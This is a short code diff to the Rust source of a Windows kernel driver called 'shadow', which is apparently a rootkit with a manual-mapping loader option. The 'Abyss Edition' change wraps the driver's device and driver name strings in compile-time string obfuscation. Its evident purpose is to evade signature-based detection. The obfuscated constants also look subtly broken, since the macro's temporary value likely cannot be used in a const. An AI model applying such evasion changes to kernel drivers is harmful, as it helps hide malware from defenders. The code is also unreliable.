@@ -5,6 +5,9 @@
 extern crate alloc;
 extern crate wdk_panic;
 
+// Abyss Edition: String obfuscation
+use obfstr::obfstr;
+
 mod util;
 mod ioctls;
 mod allocator;
@@ -23,11 +26,11 @@ use callback::{
     Callback
 };
 
-/// The name of the device in the device namespace.
-const DEVICE_NAME: &str = "\\Device\\shadow";
+/// The name of the device in the device namespace (obfuscated).
+const DEVICE_NAME: &str = obfstr!("\\Device\\shadow");
 
-/// The name of the device in the DOS device namespace.
-const DOS_DEVICE_NAME: &str = "\\DosDevices\\shadow";
+/// The name of the device in the DOS device namespace (obfuscated).
+const DOS_DEVICE_NAME: &str = obfstr!("\\DosDevices\\shadow");
 
 // Global instance of the `IoctlManager`.
 static mut MANAGER: Lazy<Mutex<ioctls::IoctlManager>> = Lazy::new(|| { 
@@ -59,7 +62,7 @@ pub unsafe extern "system" fn driver_entry(
     #[cfg(feature = "mapper")] {
         use shadow_core::IoCreateDriver;
 
-        const DRIVER_NAME: &str = "\\Driver\\shadow";
+        const DRIVER_NAME: &str = obfstr!("\\Driver\\shadow");
         let mut driver_name = uni::str_to_unicode(DRIVER_NAME).to_unicode();
         let status = IoCreateDriver(&mut driver_name, Some(shadow_entry));
         if !NT_SUCCESS(status) {
